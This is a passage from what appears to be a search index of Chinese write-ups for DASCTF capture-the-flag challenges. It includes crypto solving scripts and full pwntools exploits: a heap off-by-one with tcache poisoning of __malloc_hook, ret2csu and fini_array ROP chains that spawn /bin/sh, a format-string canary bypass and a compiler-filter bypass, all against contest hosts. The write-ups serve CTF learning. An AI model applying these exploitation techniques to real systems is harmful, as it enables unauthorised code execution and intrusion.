'' . join ( f3 ) with open ( 'f1ag.png' , 'wb' ) as f : f . write ( f4 ) \u7136\u540e\u5728\u5bf9\u5e94\u7f51\u7ad9\u4e0a\u89e3\u5bc6\u5373\u53ef\u3002","title":"baby_web"},{"location":"wp/DASCTF/#bincat-2","text":"\u8003\u70b9\uff1a\u4e8c\u7ef4\u7801\u8f6c\u6362 \u6211\u662f\u76f4\u63a5\u628a\u56fe\u7247\u7528ste\u5904\u7406\u7136\u540e\u8c03\u5230\u5bf9\u6bd4\u5ea6\u6bd4\u8f83\u9ad8\u7684\u901a\u9053\u626b\u5373\u53ef\uff08\u9003","title":"bin/cat 2"},{"location":"wp/DASCTF/#questionnaire","text":"\u8003\u70b9\uff1a\u67e5\u6e90\u7801 \u7b7e\u5230\u9898\u4e0d\u8bf4\u4e86\uff0c\u7b54\u6848\u5728\u6e90\u7801\uff0c\u8fde\u63a5\u4e0b\u9762\u7684\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u5373\u53ef","title":"questionnaire"},{"location":"wp/DASCTF/#crypto","text":"","title":"Crypto"},{"location":"wp/DASCTF/#bbcrypto","text":"\u8003\u70b9\uff1a\u7b80\u5355\u52a0\u5bc6 \u901a\u8fc7\u5df2\u77e5\u5bc6\u6587\u548c\u90e8\u5206\u660e\u6587\u679a\u4e3e\u51faa\u548csalt\uff0c\u7136\u540e\u901a\u8fc7\u5bc6\u6587\u679a\u4e3eflag\u503c\uff08\u811a\u672c\u5199\u7684\u592a\u8fa3\u9e21\u4e86\uff0c\u8f7b\u55b7 from __future__ import print_function import string from itertools import * enc = '177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d' dict1 = string . ascii_lowercase #print dict1 #salt = 'abc' #si = cycle(salt.lower()) def encrypt ( m , a , si ): c = \"\" for i in range ( len ( m )): c += hex ((( ord ( m [ i ])) * a + ord ( next ( si ))) % 128 )[ 2 :] . zfill ( 2 ) return c # for i in dict1: # for j in dict1: # for k in dict1: # salt = i+j+k # si = cycle(salt.lower()) # for m in range(128): # if encrypt('flag{',m,si) == '177401504b': # print m salt = 'ahh' a = 57 si = cycle ( salt . lower ()) enc = '177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d' flag = '' dict2 = '0123456789' + string . ascii_lowercase + ' {} ' # for m in range(len(enc)/2): # for i in dict2: # for salt in ['ahh','hah','hha']: # if encrypt(i,a,si) == enc[m*2:m*2+2]: # print(i,end='') # break flag = list ( 'ad7vd9z7v3rffdd2q8w5vb4s7x6ua1ra7v2s7vb3ta8wfbc4u' ) for i in flag : if ord ( i ) > ord ( 'f' ): flag . remove ( i ) print ( '' . join ( flag ))","title":"bbcrypto"},{"location":"wp/DASCTF/#easylcg","text":"\u8003\u70b9\uff1aLCG\u7b80\u5355\u5229\u7528 \u6bd4\u8f83\u7b80\u5355\u7684LCG\uff0c\u901a\u8fc7output\u679a\u4e3e\u51fas1\uff0c\u7136\u540e\u901a\u8fc7s1\u6c42\u51fas2\uff0c\u8fdb\u800cs3\u4e5f\u80fd\u88ab\u9884\u6d4b\uff1a from Crypto.Util.number import * a = 3844066521 b = 3316005024 m = 2249804527 for i in range ( 65536 ): s1 = int ( bin ( 16269 )[ 2 :] + bin ( i )[ 2 :] . zfill ( 16 ), 2 ) s2 = ( s1 * a + b ) % m if s2 >> 16 == 4249 : print s1 \u7136\u540e\u6539\u4e00\u4e0b\u52a0\u5bc6\u811a\u672c\u5c31\u80fd\u6c42\u51fakey\uff1a from Crypto.Util.number import * class lcg : def __init__ ( self ): self . a = 3844066521 self . b = 3316005024 self . m = 2249804527 self . seed = 278490266 def next ( self ): self . seed = ( self . a * self . seed + self . b ) % self . m return self . seed >> 16 class DH : def __init__ ( self ): self . lcg = lcg () self . g = 183096451267674849541594370111199688704 self . m = 102752586316294557951738800745394456033378966059875498971396396583576430992701 self . A , self . a = self . gen_AB () self . B , self . b = self . gen_AB () self . key = pow ( self . A , self . b , self . m ) def gen_AB ( self ): x = '' for _ in range ( 64 ): x += '1' if self . lcg . next () % 2 else '0' return pow ( self . g , int ( x , 2 ), self . m ), int ( x , 2 ) #DH = DH() print long_to_bytes ( DH () . key ^ 13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703 )","title":"easyLCG"},{"location":"wp/DASCTF/#pwn","text":"","title":"pwn"},{"location":"wp/DASCTF/#taqinioj-0-100","text":"\u7a0b\u5e8f\u6a21\u62df\u4e86c\u8bed\u8a00\u7f16\u8bd1\u5668\uff0c\u4f46\u662f\u5bf9\u8f93\u5165c\u4ee3\u7801\u8fdb\u884c\u4e86\u654f\u611f\u5b57\u7b26\u8fc7\u6ee4\u53ef\u4ee5\u5229\u7528\u5b57\u7b26\u62fc\u63a5\uff0c\u5f02\u6216\u64cd\u4f5c\u7b49\u4f7f\u654f\u611f\u5b57\u7b26\u5728\u7a0b\u5e8f\u8fd0\u884c\u4e2d\u5f97\u5230\u800c\u4e0d\u662f\u5728\u5c06\u5176\u8f93\u5165\u5230c\u4ee3\u7801\u4e2d\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10002 ) else : sh = process () if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' code = ''' #include <stdio.h> #include <stdlib.h> char name[20]=\"/hom\"; char a[]=\"e/ct\"; char b[]=\"f/fl\"; char c[2]=\"ag\"; char ff[0x300]; int main() { for(int i=0;i<4;i++) name[4+i]=a[i]; for(int i=0;i<4;i++) name[8+i]=b[i]; name[12]=c[0]; name[13]=c[1]; printf(\" %s \",name); FILE * fd=fopen(name,\"r\"); if(fd==-1) { printf(\"error\"); return 0; } fread(ff,1,0x100,fd); printf(\" %s \",ff); return 0; }@ ''' sh . sendline ( test ) sh . interactive () \u8fd9\u4e2a\u9898\u76ee\u8fd8\u6709\u4e00\u4e2a\u975e\u9884\u671f\u89e3 #include '/home/ctf/fl\\ ag' \u8fd9\u4e2a\u65b9\u6cd5\u4e5f\u53ef\u7528\u6765\u505aTaQiniOJ-1","title":"TaQiniOJ-0 - 100"},{"location":"wp/DASCTF/#memory-moster-i","text":"\u6808\u6ea2\u51fa\uff0c\u4f46\u662f\u6709Canary\u4fdd\u62a4\uff0c\u6240\u4ee5\u53ef\u4ee5\u52ab\u6301__stack_chk_fail\u51fd\u6570\u6765getshell from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10081 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './pwn' ) stack_fail = 0x0000000000404028 target = 0x000000000040124A sh . recvuntil ( 'addr:' ) payload = p64 ( stack_fail ) . ljust ( 0x30 , ' \\x00 ' ) sh . sendline ( payload ) sh . recvuntil ( 'data:' ) sh . send ( p64 ( target )) sh . interactive ()","title":"Memory Moster \u2160"},{"location":"wp/DASCTF/#happyending","text":"libc2.29\u4e0b\u7684off_by_one\uff0c\u9700\u8981\u7ed5\u8fc7presize\u548cunlink\u68c0\u6d4b\uff0c\u4f46\u662f\u6ca1\u6709\u529e\u6cd5\u6cc4\u6f0fheap\u7684\u5730\u5740\uff0c\u6240\u4ee5\u9700\u8981\u7075\u6d3b\u7684\u5229\u7528largbin\uff0csmallbin fastbin\u6b8b\u7559\u7684\u6570\u636e\u6765bypass\u524d\u9762\u7684\u68c0\u6d4b\uff0c\u8fdb\u800c\u5229\u7528off_by_one\u5b8c\u6210\u5bf9\u5408\u5e76\u5b9e\u73b0chunk overlapping\u3002\u4e4b\u540e\u5c31\u53ef\u4ee5\u5229\u7528tcache_dup\u6765\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5206\u914d\u7684\u76ee\u7684\uff0c\u4fee\u6539__malloc_hook\u6765getshell from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10106 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' def choice ( elect ): sh . recvuntil ( '>' ) sh . sendline ( str ( elect )) def add ( size , content ): choice ( 1 ) sh . recvuntil ( ':' ) sh . sendline ( str ( size )) sh . recvuntil ( '!' ) sh . send ( content ) def show ( index ): choice ( 3 ) sh . recvuntil ( ':' ) sh . sendline ( str ( index )) def delete ( index ): choice ( 2 ) sh . recvuntil ( ':' ) sh . sendline ( str ( index )) libc = ELF ( './libc.so.6' ) #padding for i in range ( 3 ): add ( 0x1000 , 'padding' ) #+0-2 add ( 0xc20 , 'padding' ) #+3 #get fake chunk for i in range ( 7 ): add ( 0x28 , 'a' ) #+4-10 add ( 0xb00 , 'a' ) #11 add ( 0x10 , 'a' ) #12 delete ( 11 ) #-11 add ( 0x28 , p64 ( 0 ) + p64 ( 0x201 ) + p8 ( 0x40 )) #11 #make fake chunk fd->bk=fake chunk add ( 0xb00 , 'a' ) #13 ==>make 12 to largebin add ( 0x28 , p64 ( 0 ) + p64 ( 0 ) + p64 ( 0 ) + p8 ( 0x10 )) #14 #make fake chunk bk->fd=fake chunk add ( 0x28 , 'a' ) #15 add ( 0x28 , 'a' ) #16 for i in range ( 7 ): delete ( 4 + i ) #-4-10 delete ( 15 ) #-15 delete ( 11 ) #-11 for i in range ( 7 ): add ( 0x28 , 'a' ) #+4-10 add ( 0x28 , ' \\x10 ' ) #+11 ==>modify fake chunk add ( 0x28 , 'a' ) #+15 add ( 0x80 , 'a' ) #17 add ( 0x80 , 'a' ) #18 add ( 0x28 , 'a' ) #19 add ( 0x8f0 , 'a' ) #20 # null of by one delete ( 19 ) #-19 add ( 0x28 , p64 ( 0 ) * 4 + p64 ( 0x200 )) delete ( 20 ) #-20 #leak libc add ( 0xa0 , 'a' ) #+19 add ( 0x80 , 'a' ) #+21 add ( 0x9b0 , 'a' ) #+22 for i in range ( 7 ): add ( 0x80 , 'a' ) #23-29 for i in range ( 7 ): delete ( 23 + i ) #-23-29 delete ( 21 ) show ( 17 ) sh . recvuntil ( ' \\n ' ) libc_base = u64 ( sh . recvuntil ( '1' ) . replace ( '1' , ' \\x00 ' ) . ljust ( 8 , ' \\x00 ' )) - 0x1e4ca0 malloc_hook = libc_base + libc . symbols [ '__malloc_hook' ] realloc = libc_base + libc . symbols [ 'realloc' ] onegadget = libc_base + 0x106ef8 print hex ( onegadget ) #tcache dup for i in range ( 7 ): add ( 0x80 , 'a' ) delete ( 22 ) add ( 0xa40 , p64 ( 0 ) * 17 + p64 ( 0x91 )) delete ( 18 ) delete ( 22 ) #get shell add ( 0xa40 , p64 ( 0 ) * 17 + p64 ( 0x91 ) + p64 ( malloc_hook - 8 )) add ( 0x80 , 'a' ) add ( 0x80 , p64 ( onegadget ) + p64 ( realloc + 6 )) choice ( 1 ) sh . recvuntil ( ':' ) sh . sendline ( '200' ) sh . interactive ()","title":"happyending"},{"location":"wp/DASCTF/#secret2","text":"\u6bcf\u5faa\u73af\u4e00\u6b21\u90fd\u4f1a\u6253\u5f00\u4e00\u6b21\u8bbe\u5907\uff0c\u800clinux\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6700\u591a\u53ea\u80fd\u6253\u5f001024\u4e2a\u8bbe\u5907\uff0c\u6240\u4ee5\u5f53\u6253\u5f00\u8d85\u8fc71024\u4ee5\u540e\uff0c\u5c06\u4f1a\u6253\u5f00\u5931\u8d25\uff0c\u800c\u8bfb\u53d6\u6253\u5f00\u5931\u8d25\u7684\u6587\u4ef6\u8bbe\u5907\u8bfb\u5165\u6570\u636e\u5c06\u4f1a\u662f\u96f6\u3002 \u7a0b\u5e8f\u8fd8\u5b58\u5728\u4e00\u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4f46\u662f\u5173\u95ed\u4e86\u8f93\u5165\u8bbe\u5907\uff0c\u6240\u4ee5\u6211\u4eec\u7684payload\u8981\u4e00\u6b21\u6027\u5c31\u53ef\u4ee5\u83b7\u5f97flag\uff0c\u6211\u4eec\u4e3b\u8981\u5230\u7a0b\u5e8f\u4e2d\u6709\u4e00\u4e2a\u5b57\u7b26\u4e32cat/flag\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u5b57\u7b26\u4e32\u62f7\u8d1d\u5230bss\u6bb5\uff0c\u5e76\u5c06/\u66ff\u6362\u4e3a\u7a7a\u683c\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528system\u6765\u83b7\u5f97flag\u3002\u521a\u597d\u6211\u4eec\u6709memcpt\uff0cmemset\u51fd\u6570\u53ef\u4ee5\u4f7f\u7528\uff0c\u63a5\u4e0b\u6765\u9700\u8981\u89e3\u51b3\u7684\u95ee\u9898\u5c31\u662f\u53bb\u63a7\u5236rdi\uff0crsi\uff0crdx\u4e09\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u7a0b\u5e8f\u6ca1\u6709pop rdx\uff1bret\u8fd9\u6837\u7684gadget\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u80fd\u5229\u7528libc_scu_init\u6765\u6267\u884c\u51fd\u6570\uff0c\u8fd9\u91cc\u8981\u6ce8\u610f\u7075\u6d3b\u7ec4\u5408payload\uff0c\u4e0d\u8981\u6d6a\u8d39\u4efb\u4f55\u4e00\u4e2a\u5b57\u8282\uff0c\u56e0\u4e3a\u7528libc_sct_init\u6765\u6267\u884c\u51fd\u6570\u7684\u8bdd\uff0c\u9700\u8981\u7684\u6ea2\u51fa\u7a7a\u95f4\u6bd4\u8f83\u5927\uff0c\u800c\u6211\u4eec\u53ea\u80fd\u6ea2\u51fa0x100-9\u7684\u5730\u5740\uff0c\u6240\u4ee5\u8981\u597d\u597d\u7684\u7ec4\u5408\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10051 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './secret2' ) #make payload bss = 0x00000000004040A8 pop6_ret = 0x401612 begin = 0x4015f8 memcpy = 0x0000000000404060 memset = 0x0000000000404040 rdi_ret = 0x000000000040161b system = 0x0000000000401060 def make_payload ( rdi , rsi , rdx , func ): p = p64 ( 0 ) + p64 ( 1 ) + p64 ( func ) + p64 ( rdi ) + p64 ( rsi ) + p64 ( rdx ) p += p64 ( begin ) return p payload = ' \\x00 ' * 9 #1 payload += p64 ( pop6_ret ) + make_payload ( bss , 0x0000000004021DB , 8 , memcpy ) #2 payload += p64 ( 0 ) + make_payload ( bss + 3 , 0x20 , 1 , memset ) payload += p64 ( 0 ) * 7 + p64 ( rdi_ret ) + p64 ( bss ) + p64 ( system ) print len ( payload ) sh . recvuntil ( 'name?' ) sh . send ( payload ) #bypass secret while True : sh . recvuntil ( 'Secret' ) sh . send ( ' \\x00 ' * 8 ) sh . recvuntil ( 'JOB' ) times = int ( sh . recvuntil ( 'TIMES' ) . replace ( 'TIMES' , '' ) . replace ( ' ' , '' )) print times if times == 0 : break sh . recvuntil ( 'Secret' ) sh . sendline ( 'a' ) sh . recvuntil ( 'Secret' ) sh . send ( ' \\x00 ' * 8 ) sh . interactive ()","title":"Secret2"},{"location":"wp/DASCTF/#memory-moster-ii","text":"\u5229\u7528\u7a0b\u5e8f\u4ecemain\u51fd\u6570\u7ed3\u675f\u540e\u4f1a\u8c03\u7528fini_array\u91cc\u9762\u7684\u51fd\u6570\uff0c\u6765\u6808\u8fc1\u79fb\u8fdb\u800c\u5199ROP\uff0c\u83b7\u53d6shell\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10081 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './pwn' ) # gdb.attach(sh,''' # b*0x0000000000401746 # c # ''') def modify_fini ( addr , data ): sh . recvuntil ( 'addr:' ) sh . send ( p64 ( addr )) sh . recvuntil ( 'data:' ) sh . send ( data ) fini_array = 0x00000000004B80B0 main = 0x0000000000401C1D libc_fini = 0x0000000000402CB0 rdx_ret = 0x0000000000448415 rsi_ret = 0x0000000000406f80 rdi_ret = 0x0000000000401746 rax_ret = 0x0000000000448fcc bss = 0x0000000004C0790 + 0x10 system = 0x0000000000410A50 read = 0x000000000448400 ret = 0x0000000000401016 leave = 0x0000000000401CF3 syscall = 0x44840c modify_fini ( fini_array , p64 ( libc_fini ) + p64 ( main )) #read(0,bss,0x10) modify_fini ( fini_array + 0x10 , p64 ( rdi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x20 , p64 ( rsi_ret ) + p64 ( bss )) modify_fini ( fini_array + 0x30 , p64 ( rdx_ret ) + p64 ( 0x10 )) modify_fini ( fini_array + 0x40 , p64 ( read ) + p64 ( rdi_ret )) #execve('bin/sh',0,0) modify_fini ( fini_array + 0x50 , p64 ( bss ) + p64 ( ret )) modify_fini ( fini_array + 0x60 , p64 ( rsi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x70 , p64 ( rdx_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x80 , p64 ( rax_ret ) + p64 ( 0x3b )) modify_fini ( fini_array + 0x90 , p64 ( syscall ) + p64 ( ret )) #stack pivoit modify_fini ( fini_array , p64 ( leave ) + p64 ( ret )) sh . sendline ( '/bin/sh \\x00 ' ) sh . interactive ()","title":"Memory Moster \u2161"},{"location":"wp/DASCTF/#memory-mosteriii","text":"\u539f\u7406\u548c\u4e0a\u4e00\u9898\u76f8\u540c\uff0cexp\u4e5f\u662f\u7c7b\u4f3c\uff0c\u77e5\u8bc6gadget\u6709\u4e00\u70b9\u533a\u522b\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10081 ) else : sh = process ( './pwn' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' elf = ELF ( './pwn' ) # gdb.attach(sh,''' # b*0x0000000000401746 # c # ''') def modify_fini ( addr , data ): sh . recvuntil ( 'addr:' ) sh . send ( p64 ( addr )) sh . recvuntil ( 'data:' ) sh . send ( data ) fini_array = 0x00000000004B50B0 main = 0x0000000000401C1D libc_fini = 0x0000000000402CA0 rdx_ret = 0x0000000000447635 rsi_ret = 0x0000000000406f70 rdi_ret = 0x0000000000401746 rax_ret = 0x000000000044806c bss = 0x00000000004BD790 + 0x10 read = 0x0000000000447620 ret = 0x0000000000401016 leave = 0x0000000000401CF3 syscall = 0x44762c modify_fini ( fini_array , p64 ( libc_fini ) + p64 ( main )) #read(0,bss,0x10) modify_fini ( fini_array + 0x10 , p64 ( rdi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x20 , p64 ( rsi_ret ) + p64 ( bss )) modify_fini ( fini_array + 0x30 , p64 ( rdx_ret ) + p64 ( 0x10 )) modify_fini ( fini_array + 0x40 , p64 ( read ) + p64 ( rdi_ret )) #execve('bin/sh',0,0) modify_fini ( fini_array + 0x50 , p64 ( bss ) + p64 ( ret )) modify_fini ( fini_array + 0x60 , p64 ( rsi_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x70 , p64 ( rdx_ret ) + p64 ( 0 )) modify_fini ( fini_array + 0x80 , p64 ( rax_ret ) + p64 ( 0x3b )) modify_fini ( fini_array + 0x90 , p64 ( syscall ) + p64 ( ret )) #stack pivoit modify_fini ( fini_array , p64 ( leave ) + p64 ( ret )) sh . sendline ( '/bin/sh \\x00 ' ) sh . interactive ()","title":"Memory Moster\u2162"},{"location":"wp/DASCTF/#easybabystack","text":"\u8fd9\u9053\u9898\u5229\u7528\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32*\u7684\u7279\u6027\u3002 *\u53ef\u4ee5\u7528\u53c2\u6570\u6765\u8ba1\u7b97\u5360\u4f4d\u7b26\u7684\u5bbd\u5ea6\u3002\u5982:%*2$c\uff0c\u5c31\u662f\u7528\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u503c\u6765\u51b3\u5b9a\u8fd9\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u7684\u5bbd\u5ea6\u3002\u5229\u7528\u8fd9\u4e00\u7279\u6027\u6211\u4eec\u5c31\u53ef\u4ee5\u8f93\u51fa\u548ccanary\u4e00\u6837\u5927\u5c0f\u7684\u5b57\u7b26\u8fdb\u800c\u7528%n\u4fee\u6539\u53d8\u91cf\u6765bypass\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( '183.129.189.60' , 10001 ) else : sh = process ( './easybabystack' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' # gdb.attach(sh,''' # b*0x00000000004016C7 # c # ''') start = 0x0000000000401710 pop6_ret = 0x00000000040172A read_plt = 0x0000000000404038 bss = 0x00000000004040C8 + 0x10 system = 0x000000000401040 rdi_ret = 0x0000000000401733 def make_payload ( rdi , rsi , rdx , addr ): p = p64 ( pop6_ret ) + p64 ( 0 ) + p64 ( 1 ) + p64 ( rdi ) + p64 ( rsi ) + p64 ( rdx ) + p64 ( addr ) p += p64 ( start ) + p64 ( 0 ) * 7 return p sh . recvuntil ( 'name:' ) sh . sendline ( '%*18$c%5$n' ) sh . recvuntil ( 'passwd:' ) a = 0xfe sh . sendline ( str ( a )) sh . recvuntil ( 'message:' ) payload = 'a' * 0x118 payload += make_payload ( 0 , bss , 0x10 , read_plt ) payload += p64 ( rdi_ret ) + p64 ( bss ) + p64 ( system ) sh . sendline ( payload ) sh . interactive ()","title":"easybabystack"}]}